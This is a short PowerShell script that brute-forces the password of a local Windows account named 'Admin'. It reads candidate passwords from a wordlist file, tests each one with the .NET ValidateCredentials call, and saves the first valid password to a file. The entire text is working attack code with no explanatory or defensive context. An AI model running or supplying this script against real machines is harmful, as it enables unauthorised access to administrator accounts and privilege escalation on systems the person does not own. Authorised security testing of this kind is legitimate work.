$filePath = "passwords.txt"

$successFilePath = "success.txt"

$user = "Admin"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

$t = [System.DirectoryServices.AccountManagement.ContextType]::Machine
$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($t)

$passwords = Get-Content $filePath

foreach ($password in $passwords) {
    $isValid = $context.ValidateCredentials($user, $password)
    if ($isValid) {
        $password | Out-File $successFilePath -Encoding UTF8
        Write-Host "The command completed successfully!: $password"
        break
    }
}
